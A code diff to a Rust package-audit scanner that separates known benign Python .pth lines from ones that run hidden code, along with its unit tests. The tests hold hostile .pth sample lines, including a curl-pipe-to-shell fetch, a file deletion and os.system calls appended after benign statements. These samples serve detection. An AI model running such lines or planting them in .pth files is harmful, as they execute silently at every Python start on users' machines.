@@ -201,28 +201,154 @@ pub fn script_packages(installed: &[Installed]) -> Vec<ScriptPackage> {
     out
 }
 
+/// Statements of well-known benign `.pth` lines, whitespace removed and
+/// each package-name string as `N` (see [`pth_statement_shape`]):
+/// setuptools' distutils shim, virtualenv's bootstrap and the namespace
+/// package stubs setuptools has written over the years. Editable-install
+/// finders are matched in [`benign_pth_statement`].
+const BENIGN_PTH: &[&str] = &[
+    "",
+    "importos",
+    "importsys,types,os",
+    "import_virtualenv",
+    "var='SETUPTOOLS_USE_DISTUTILS'",
+    "enabled=os.environ.get(var,'local')=='local'",
+    "enabled=os.environ.get(var,'stdlib')=='local'",
+    "enabledand__import__('_distutils_hack').add_shim()",
+    "has_mfs=sys.version_info>(3,5)",
+    "p=os.path.join(sys._getframe(1).f_locals['sitedir'],*(N))",
+    "ie=os.path.exists(os.path.join(p,'__init__.py'))",
+    "importlib=has_mfsand__import__('importlib.util')",
+    "importlib=__import__('importlib.util')",
+    "has_mfsand__import__('importlib.machinery')",
+    "__import__('importlib.machinery')",
+    "m=has_mfsandsys.modules.setdefault(N,importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec(N,[os.path.dirname(p)])))",
+    "m=sys.modules.setdefault(N,importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec(N,[os.path.dirname(p)])))",
+    "m=morsys.modules.setdefault(N,types.ModuleType(N))",
+    "m=notieandsys.modules.setdefault(N,types.ModuleType(N))",
+    "mp=(mor[])andm.__dict__.setdefault('__path__',[])",
+    "(pnotinmp)andmp.append(p)",
+    "mandsetattr(sys.modules[N],N,m)",
+];
+
+/// String literals the [`BENIGN_PTH`] shapes spell out; any other
+/// dotted-name literal is a package name.
+const PTH_FIXED_LITERALS: &[&str] = &[
+    "SETUPTOOLS_USE_DISTUTILS",
+    "local",
+    "stdlib",
+    "_distutils_hack",
+    "sitedir",
+    "__init__.py",
+    "importlib.util",
+    "importlib.machinery",
+    "__path__",
+];
+
+/// The statements of one `.pth` line: split at `;` outside string literals.
+fn pth_statements(line: &str) -> Vec<&str> {
+    let mut out = Vec::new();
+    let (mut start, mut quote, mut escaped) = (0, None, false);
+    for (i, c) in line.char_indices() {
+        match quote {
+            Some(_) if escaped => escaped = false,
+            Some(_) if c == '\\' => escaped = true,
+            Some(q) if c == q => quote = None,
+            Some(_) => {}
+            None if c == '\'' || c == '"' => quote = Some(c),
+            None if c == ';' => {
+                out.push(&line[start..i]);
+                start = i + 1;
+            }
+            None => {}
+        }
+    }
+    out.push(&line[start..]);
+    out
+}
+
+/// `stmt` with whitespace outside string literals removed, literals in
+/// single quotes, and each package-name literal (a dotted name not in
+/// [`PTH_FIXED_LITERALS`]) as `N`; a tuple of names becomes `(N)`.
+fn pth_statement_shape(stmt: &str) -> String {
+    let mut out = String::new();
+    let mut chars = stmt.chars();
+    while let Some(c) = chars.next() {
+        if c != '\'' && c != '"' {
+            if !c.is_whitespace() {
+                out.push(c);
+            }
+            continue;
+        }
+        let mut lit = String::new();
+        let mut closed = false;
+        for d in chars.by_ref() {
+            if d == c {
+                closed = true;
+                break;
+            }
+            lit.push(d);
+        }
+        let name = !lit.is_empty()
+            && lit
+                .chars()
+                .all(|d| d.is_ascii_alphanumeric() || d == '_' || d == '.')
+            && !PTH_FIXED_LITERALS.contains(&lit.as_str());
+        if !closed || (!name && lit.contains(['\\', '\''])) {
+            // Not a literal these shapes know: keep it so nothing matches.
+            out.push(c);
+            out.push_str(&lit);
+        } else if name {
+            out.push('N');
+        } else {
+            out.push('\'');
+            out.push_str(&lit);
+            out.push('\'');
+        }
+    }
+    while out.contains("N,N") {
+        out = out.replace("N,N", "N");
+    }
+    out.replace("(N,)", "(N)")
+}
+
+/// Whether `stmt` is one of the known benign `.pth` statements.
+fn benign_pth_statement(stmt: &str) -> bool {
+    let shape = pth_statement_shape(stmt);
+    let ident =
+        |s: &str| !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
+    // setuptools' editable finders: `import __editable___<pkg>_finder;
+    // __editable___<pkg>_finder.install()`.
+    let editable = shape
+        .strip_prefix("import__editable___")
+        .or_else(|| {
+            shape
+                .strip_prefix("__editable___")
+                .and_then(|s| s.strip_suffix(".install()"))
+        })
+        .is_some_and(ident);
+    editable || BENIGN_PTH.contains(&shape.as_str())
+}
+
 /// Why the executable lines of a `.pth` file look malicious; empty when
 /// they do not. `.pth` lines run at every Python start, so on top of the
 /// usual Python signals, writing or deleting files counts: nothing
-/// legitimate does that at interpreter start. Well-known benign shapes are
-/// recognised first, since several use `__import__` or `os.environ`:
-/// setuptools' distutils shim, editable-install finders, virtualenv's
-/// bootstrap and namespace-package stubs.
+/// legitimate does that at interpreter start. Statements of well-known
+/// benign lines are set aside first ([`BENIGN_PTH`]), since several use
+/// `__import__` or `os.environ`; everything else on the line, including
+/// anything appended to a benign statement, is inspected.
 pub fn pth_signals(code: &str) -> Vec<String> {
     let mut out: Vec<String> = Vec::new();
     for line in code.lines() {
-        let l = line.trim();
-        let benign = l.starts_with("import __editable__")
-            || l.starts_with("import _virtualenv")
-            || (l.contains("'_distutils_hack'")
-                && l.contains("add_shim()")
-                && !l.contains("exec("))
-            || (l.contains("f_locals['sitedir']")
-                && l.contains("importlib")
-                && !l.contains("exec("));
-        if benign {
+        let rest: Vec<&str> = pth_statements(line.trim())
+            .into_iter()
+            .filter(|s| !benign_pth_statement(s))
+            .collect();
+        if rest.is_empty() {
             continue;
         }
+        let l = rest.join(";");
+        let l = l.as_str();
         out.extend(crate::modules::pip_audit::scan_python_signals(l));
         let writes = l.contains(".write(")
             || ["'w'", "\"w\"", "'a'", "\"a\"", "'wb'", "\"wb\""]
@@ -420,6 +546,10 @@ mod tests {
             "import __editable___mypkg_1_0_finder; __editable___mypkg_1_0_finder.install()",
             "import _virtualenv",
             "import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));importlib = has_mfs and __import__('importlib.util')",
+            // setuptools' current namespace stub, for a nested namespace.
+            "import sys, types, os;p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google', 'cloud'));importlib = __import__('importlib.util');__import__('importlib.machinery');m = sys.modules.setdefault('google.cloud', importlib.util.module_from_spec(importlib.machinery.PathFinder.find_spec('google.cloud', [os.path.dirname(p)])));m = m or sys.modules.setdefault('google.cloud', types.ModuleType('google.cloud'));mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p);m and setattr(sys.modules['google'], 'cloud', m)",
+            // The oldest one.
+            "import sys, types, os;p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('zope',));ie = os.path.exists(os.path.join(p,'__init__.py'));m = not ie and sys.modules.setdefault('zope', types.ModuleType('zope'));mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p)",
         ] {
             assert!(pth_signals(benign).is_empty(), "{benign}");
         }
@@ -428,9 +558,34 @@ mod tests {
             "import os; os.system('curl x | sh')",
             "import urllib.request; urllib.request.urlopen('http://x')",
             "import shutil; shutil.rmtree('/tmp/x')",
+            // Code appended to a benign statement is still inspected.
+            "import __editable___mypkg_1_0_finder; __editable___mypkg_1_0_finder.install(); open('/tmp/canary', 'w').write('x')",
+            "import _virtualenv; import os; os.system('id')",
+            "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); __import__('os').system('id')",
+            "import sys, types, os;p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('g',));os.remove(p)",
+            // A `;` inside a string does not hide what follows it.
+            "import _virtualenv; x = ';'; import subprocess; subprocess.run('id')",
         ] {
             assert!(!pth_signals(bad).is_empty(), "{bad}");
         }
+    }
+
+    #[test]
+    fn pth_statements_split_outside_strings() {
+        assert_eq!(
+            pth_statements("import os; x = 'a;b'; y = \"c;d\""),
+            ["import os", " x = 'a;b'", " y = \"c;d\""]
+        );
+        assert_eq!(
+            pth_statement_shape("m and setattr(sys.modules['google'], 'cloud', m)"),
+            "mandsetattr(sys.modules[N],N,m)"
+        );
+        // An editable finder name must be the whole statement.
+        assert!(benign_pth_statement("import __editable___a_1_finder"));
+        assert!(!benign_pth_statement("import __editable___a_1_finder, os"));
+        assert!(!benign_pth_statement(
+            "__editable___a.install(os.system('id'))"
+        ));
     }
 
     use super::*;
